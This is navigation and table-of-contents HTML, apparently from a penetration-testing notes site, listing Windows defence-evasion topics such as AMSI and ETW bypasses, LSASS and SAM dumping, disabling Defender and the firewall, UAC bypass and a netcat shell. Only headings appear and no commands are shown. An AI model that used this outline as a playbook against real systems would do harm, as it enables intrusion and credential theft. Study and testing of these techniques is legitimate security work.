    <nav class="md-nav" aria-label="Code signing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#convert-pem-to-pfx-with-openssl" class="md-nav__link">
    <span class="md-ellipsis">
      Convert Pem to PFX with openssl
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-pfx-file-for-code-signing-eku" class="md-nav__link">
    <span class="md-ellipsis">
      Check .pfx file for code signing EKU
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sign-a-tool" class="md-nav__link">
    <span class="md-ellipsis">
      Sign a tool
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-signer-certificate-of-tool" class="md-nav__link">
    <span class="md-ellipsis">
      Get Signer Certificate of tool
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lolbas" class="md-nav__link">
    <span class="md-ellipsis">
      LOLBAS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LOLBAS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#rundll32exe-and-comsvcsdll-dumping-lsass" class="md-nav__link">
    <span class="md-ellipsis">
      rundll32.exe and comsvcs.dll dumping lsass:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#regexe-dumping-sam" class="md-nav__link">
    <span class="md-ellipsis">
      Reg.exe dumping sam
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rundll32exe-dll-payload" class="md-nav__link">
    <span class="md-ellipsis">
      rundll32.exe dll payload
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#msbuiltexe" class="md-nav__link">
    <span class="md-ellipsis">
      Msbuilt.exe
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Msbuilt.exe">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-shellcode-injector" class="md-nav__link">
    <span class="md-ellipsis">
      Example shellcode injector
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-powershell-clm" class="md-nav__link">
    <span class="md-ellipsis">
      Example PowerShell clm
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lsass-protections" class="md-nav__link">
    <span class="md-ellipsis">
      LSASS Protections
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LSASS Protections">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#credential-guard" class="md-nav__link">
    <span class="md-ellipsis">
      Credential Guard
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Credential Guard">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-if-credential-guard-is-configured" class="md-nav__link">
    <span class="md-ellipsis">
      Check if credential guard is configured
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-credential-guard-is-running" class="md-nav__link">
    <span class="md-ellipsis">
      Check if credential guard is running
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#runasppl" class="md-nav__link">
    <span class="md-ellipsis">
      RunasPPL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="RunasPPL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-if-runasppl-is-configured" class="md-nav__link">
    <span class="md-ellipsis">
      Check if RunasPPL is configured
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defeating-av" class="md-nav__link">
    <span class="md-ellipsis">
      Defeating AV
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Defeating AV">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general_1" class="md-nav__link">
    <span class="md-ellipsis">
      General
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#obfuscation-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Obfuscation tools
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Obfuscation tools">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#c-binaries" class="md-nav__link">
    <span class="md-ellipsis">
      C# binaries
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#go-binaries" class="md-nav__link">
    <span class="md-ellipsis">
      Go binaries
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell_1" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evasion-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      Evasion techniques
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Evasion techniques">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#things-that-get-you-caught" class="md-nav__link">
    <span class="md-ellipsis">
      Things that get you caught
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#how-amsi-evaluates-powershell-commands" class="md-nav__link">
    <span class="md-ellipsis">
      How amsi evaluates PowerShell commands
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-the-following-in-scriptscode" class="md-nav__link">
    <span class="md-ellipsis">
      Change the following in scripts/code
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Change the following in scripts/code">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hash-of-filecode" class="md-nav__link">
    <span class="md-ellipsis">
      Hash of file/code
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#byte-strings" class="md-nav__link">
    <span class="md-ellipsis">
      Byte strings
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#structure-of-the-code" class="md-nav__link">
    <span class="md-ellipsis">
      Structure of the code
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-of-changing-amsi-bypass-string" class="md-nav__link">
    <span class="md-ellipsis">
      Example of changing amsi bypass string
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#defeating-microsoft-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Defeating Microsoft Defender
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#scanning-amsi" class="md-nav__link">
    <span class="md-ellipsis">
      Scanning amsi
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Scanning amsi">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#threatcheck" class="md-nav__link">
    <span class="md-ellipsis">
      Threatcheck
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#amsitrigger" class="md-nav__link">
    <span class="md-ellipsis">
      AmsiTrigger
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#offensive-net" class="md-nav__link">
    <span class="md-ellipsis">
      Offensive .NET
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Offensive .NET">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#use-custom-exe-assembyload-to-run-netloader-in-memory-and-then-load-binary" class="md-nav__link">
    <span class="md-ellipsis">
      Use custom exe Assembyload to run netloader in memory and then load binary
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#random-notes" class="md-nav__link">
    <span class="md-ellipsis">
      Random notes
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-subsystem-for-linux-wsl" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Subsystem for Linux WSL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Subsystem for Linux WSL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#netcat-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Netcat shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-whitelisting" class="md-nav__link">
    <span class="md-ellipsis">
      Bypass whitelisting
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Privileges
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privileges">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-current-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Check current privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sedebugprivileges" class="md-nav__link">
    <span class="md-ellipsis">
      SeDebugPrivileges
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SeDebugPrivileges">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#export-the-current-user-rights-set-by-the-group-policies-to-a-text-file" class="md-nav__link">
    <span class="md-ellipsis">
      Export the current user rights set by the group policies to a text file:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#edit-the-secpolicying" class="md-nav__link">
    <span class="md-ellipsis">
      Edit the secpolicy.ing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#save-the-new-user-rights-set" class="md-nav__link">
    <span class="md-ellipsis">
      Save the new user rights set
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#start-cmd-again" class="md-nav__link">
    <span class="md-ellipsis">
      Start cmd again
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#uac-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      UAC bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="UAC bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#automatec-uac-bypass-powershell-script" class="md-nav__link">
    <span class="md-ellipsis">
      Automatec UAC bypass PowerShell script
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manual-uac-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Manual UAC bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Manual UAC bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fodhelper" class="md-nav__link">
    <span class="md-ellipsis">
      Fodhelper
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-current-uac-configuration" class="md-nav__link">
    <span class="md-ellipsis">
      Check current UAC configuration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux AD
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../relaying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Relaying
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cobalt/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Certifications
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Certifications
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/oscp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSCP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/osep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSEP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/crte/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CRTE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../certifications/prolabs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB ProLabs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#general" class="md-nav__link">
    <span class="md-ellipsis">
      General
    </span>
  </a>
  
    <nav class="md-nav" aria-label="General">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-av-edr" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerating AV / EDR
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumerating AV / EDR">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#run-against-multiple-targets" class="md-nav__link">
    <span class="md-ellipsis">
      Run against multiple targets
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-all-gpos-applied-to-a-machine" class="md-nav__link">
    <span class="md-ellipsis">
      Get all GPO's applied to a machine
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Defender
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Defender">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-if-windows-defender-is-running" class="md-nav__link">
    <span class="md-ellipsis">
      Check if windows defender is running
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-info-about-windows-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Get info about Windows Defender
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-excluded-folder-from-windows-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Find excluded folder from Windows Defender
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#script-to-dump-mde-config-asr-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Script to dump MDE config / ASR rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-exclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Create exclusion
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-av-detections" class="md-nav__link">
    <span class="md-ellipsis">
      Check AV Detections
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-last-av-detection" class="md-nav__link">
    <span class="md-ellipsis">
      Get last AV Detection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-av-monitoring" class="md-nav__link">
    <span class="md-ellipsis">
      Disable AV monitoring
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#asr-rules" class="md-nav__link">
    <span class="md-ellipsis">
      ASR Rules
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ASR Rules">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerate-asr-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerate ASR rules
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-firewall" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Firewall
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Firewall">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-state" class="md-nav__link">
    <span class="md-ellipsis">
      Get state
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Get rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-firewall" class="md-nav__link">
    <span class="md-ellipsis">
      Disable Firewall
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-firewall" class="md-nav__link">
    <span class="md-ellipsis">
      Enable firewall
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-default-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Change default policy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#open-port-on-firewall" class="md-nav__link">
    <span class="md-ellipsis">
      Open port on firewall
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remove-firewall-rule" class="md-nav__link">
    <span class="md-ellipsis">
      Remove firewall rule
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShell
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PowerShell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#powershell-detections" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell detections
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#start-64-bit-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Start 64 bit powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execution-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Execution-policy
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Execution-policy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-execution-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Get Execution policy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-execution-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Bypass execution policy
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#amsi" class="md-nav__link">
    <span class="md-ellipsis">
      AMSI
    </span>
  </a>
  
    <nav class="md-nav" aria-label="AMSI">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#amsi-bypass-string" class="md-nav__link">
    <span class="md-ellipsis">
      AMSI bypass string
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#amsi-bypass-string-obfuscated" class="md-nav__link">
    <span class="md-ellipsis">
      AMSI bypass string obfuscated
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#amsi-bypass-string-2-obfuscated" class="md-nav__link">
    <span class="md-ellipsis">
      AMSI bypass string 2 obfuscated
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#etw" class="md-nav__link">
    <span class="md-ellipsis">
      ETW
    </span>
  </a>
  
    <nav class="md-nav" aria-label="ETW">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#obfusacted" class="md-nav__link">
    <span class="md-ellipsis">
      Obfusacted
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constrained-lanuage-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Constrained Lanuage Mode
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Constrained Lanuage Mode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-the-language-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Check the language mode
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#escapes-for-constrained-language-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Escapes for Constrained Language Mode
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Escapes for Constrained Language Mode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#launch-powershell-version-2" class="md-nav__link">
    <span class="md-ellipsis">
      Launch Powershell Version 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overwrite-__pslockdownpolicy-variable" class="md-nav__link">
    <span class="md-ellipsis">
      Overwrite __PSLockdownPolicy variable
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-the-__pslockdownpolicy-value" class="md-nav__link">
    <span class="md-ellipsis">
      Check the __PSLockdownPolicy value
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#set-lockdown-policy-to-8-and-check-language-mode" class="md-nav__link">
    <span class="md-ellipsis">
      Set lockdown policy to 8 and check language mode
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershx" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShx
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershdll-run-powershell-with-dlls-only" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShdll Run PowerShell with dlls only.
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PowerShdll Run PowerShell with dlls only.">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#download-files-with-certutil" class="md-nav__link">
    <span class="md-ellipsis">
      Download files with certutil
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      Execute scripts
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      Logging evasion
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Logging evasion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#invisi-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Invisi-shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#with-admin-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      With admin privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#with-non-admin-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      With non-admin privileges:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#script-block-logging-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Script Block logging bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Script Block logging bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#winrs" class="md-nav__link">
    <span class="md-ellipsis">
      Winrs
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#just-enough-admin" class="md-nav__link">
    <span class="md-ellipsis">
      Just Enough Admin
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Just Enough Admin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#connect-with-jea-endpoint" class="md-nav__link">
    <span class="md-ellipsis">
      Connect with JEA endpoint
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-pssession-configurations-and-jea" class="md-nav__link">
    <span class="md-ellipsis">
      Get the PSSession configurations (and JEA)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-pssession-capabilities" class="md-nav__link">
    <span class="md-ellipsis">
      Get PSSession capabilities
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-jea" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse JEA
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abuse JEA">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abuse-creating-functions" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse - Creating functions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-grant-a-user-to-admin" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse - Grant a user to admin
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-running-arbritary-code" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse - Running arbritary code
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abuse-set-pssessionconfiguration" class="md-nav__link">
    <span class="md-ellipsis">
      Abuse - Set-PSSessionConfiguration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Abuse - Set-PSSessionConfiguration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#connect-and-check-the-config" class="md-nav__link">
    <span class="md-ellipsis">
      Connect and check the config
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-original-sddl" class="md-nav__link">
    <span class="md-ellipsis">
      Get original SDDL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-sid-for-new-user-to-add" class="md-nav__link">
    <span class="md-ellipsis">
      Get SID for new user to add
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-new-sddl-with-a-new-user-sid" class="md-nav__link">
    <span class="md-ellipsis">
      Create new SDDL with a new USER SID
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-the-config" class="md-nav__link">
    <span class="md-ellipsis">
      Change the config
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reconnect-and-check-the-config" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnect and check the config
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#connect-to-reconfigured-new-endpoint" class="md-nav__link">
    <span class="md-ellipsis">
      Connect to reconfigured new endpoint
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    <span class="md-ellipsis">
      Applocker
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Applocker">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-if-applocker-is-enabled" class="md-nav__link">
    <span class="md-ellipsis">
      Check if Applocker is enabled
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-applocker-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerate Applocker policy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-policy-with-gporesult" class="md-nav__link">
    <span class="md-ellipsis">
      Check policy with GPOresult
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parse-gpo-applocker" class="md-nav__link">
    <span class="md-ellipsis">
      Parse GPO applocker
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#if-code-integrity-is-enforced-and-powershell-is-running-in-constrained-langauge-mode-use-winrs-instead-of-psremoting" class="md-nav__link">
    <span class="md-ellipsis">
      If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-for-the-policy-on-disk" class="md-nav__link">
    <span class="md-ellipsis">
      Check for the policy on disk
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wdac" class="md-nav__link">
    <span class="md-ellipsis">
      WDAC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-wdac" class="md-nav__link">
    <span class="md-ellipsis">
      Disable WDAC
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Disable WDAC">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-for-wdac" class="md-nav__link">
    <span class="md-ellipsis">
      Check for WDAC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-for-the-policy-on-disk_1" class="md-nav__link">
    <span class="md-ellipsis">
      Check for the policy on disk
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#code-signing" class="md-nav__link">
    <span class="md-ellipsis">
      Code signing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Code signing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#convert-pem-to-pfx-with-openssl" class="md-nav__link">
    <span class="md-ellipsis">
      Convert Pem to PFX with openssl
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-pfx-file-for-code-signing-eku" class="md-nav__link">
    <span class="md-ellipsis">
      Check .pfx file for code signing EKU
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sign-a-tool" class="md-nav__link">
    <span class="md-ellipsis">
      Sign a tool
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-signer-certificate-of-tool" class="md-nav__link">
    <span class="md-ellipsis">
      Get Signer Certificate of tool
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lolbas" class="md-nav__link">
    <span class="md-ellipsis">
      LOLBAS
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LOLBAS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#rundll32exe-and-comsvcsdll-dumping-lsass" class="md-nav__link">
    <span class="md-ellipsis">
      rundll32.exe and comsvcs.dll dumping lsass:
    </span>
  </a>
  
</li>
        
